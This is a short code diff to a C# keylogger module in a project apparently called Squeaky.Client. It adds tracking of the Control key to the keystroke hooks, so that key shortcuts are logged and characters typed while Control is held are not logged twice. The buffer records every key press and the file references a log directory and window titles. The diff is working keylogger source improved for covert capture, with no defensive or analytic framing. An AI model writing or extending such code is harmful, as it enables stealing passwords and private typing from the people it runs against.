@@ -17,6 +17,7 @@ namespace Squeaky.Client.Utilities
         private static string LastWindowTitle = "";
 
         private static bool FirstLine = true;
+        private static bool CtrlPressed = false;
 
         private static string LogDir = @"kl\";
 
@@ -63,16 +64,21 @@ namespace Squeaky.Client.Utilities
                 PressedKeys.Add(e.KeyCode);
                 LogBuffer.Append($"[{key}]{(key == "Return" ? "\n" : "" )}");
             }
+
+            if (e.Control) CtrlPressed = true;
+            if (CtrlPressed) LogBuffer.Append(e.KeyCode.ToString().ToLower());
+
         }
 
         private static void OnKeyUp(object sender, KeyEventArgs e)
         {
             PressedKeys.Remove(e.KeyCode);
+            if (e.Control) CtrlPressed = false;
         }
 
         private static void OnKeyPress(object sender, KeyPressEventArgs e)
         {
-            if (!KeyLoggerHelper.IsSpecialKey(e.KeyChar))
+            if (!KeyLoggerHelper.IsSpecialKey(e.KeyChar) && !CtrlPressed)
             {
                 LogBuffer.Append(e.KeyChar);
             }
